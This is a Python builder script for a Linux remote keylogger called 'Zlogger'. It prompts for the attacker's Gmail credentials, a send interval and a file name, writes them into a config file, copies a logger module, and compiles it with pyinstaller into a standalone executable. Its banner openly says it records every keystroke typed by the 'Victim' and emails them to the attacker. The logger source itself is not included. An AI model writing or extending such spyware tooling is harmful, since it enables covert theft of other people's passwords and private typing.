#!/usr/bin/env python

# Userspace remote keylogger for Linux, works with X, starts on user login, logs key stikes to a file and sends report by email.



from subprocess import call
from shutil import copyfile
from colorama import Fore
import os
os.system('resize -s 29 92')
os.system('clear')

HEADER = """
__________  .__                                     
\____    /  |  |   ____   ____   ____   ___________ 
  /     /   |  |  /  _ \ / ___\ / ___\_/ __ \_  __ \\
 /     /_   |  |_(  <_> ) /_/  > /_/  >  ___/|  | \/
/_______ \  |____/\____/\___  /\___  / \___  >__|   
        \/             /_____//_____/      \/       

 \n"""

print(HEADER)
print(Fore.RED +"INFO: "+Fore.WHITE+"Keylogger Recorde Every keystroks typed by Victim and send it to Your Gmail Account. ")
print(Fore.WHITE+"      Input Email address and password to Receive Keystroks.")
print("")

email = raw_input("Email : ")
password = raw_input("password : ")
sleep_interval = raw_input("Send logs every (seconds) : ")
file_name = raw_input("File Name : ")


with open("config.py",'w') as out:
    out.write("#!/usr/bin/env python\n\n")
    out.write("\nEMAIL = \"" + email + "\"")
    out.write("\nPASSWORD = \"" + password + "\"")
    out.write("\nFILE_NAME = \"" + file_name + "\"")
    out.write("\nSLEEP_INTERVAL = " + sleep_interval)

print("[+] Writeing python logger to source/" + file_name)
copyfile("logger.py", "source/" + file_name)

print("[+] Generating executable.")
call("pyinstaller --onefile source/" + file_name, shell=True)
print("\n[+] Executable is stored in dist/" + file_name)

print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
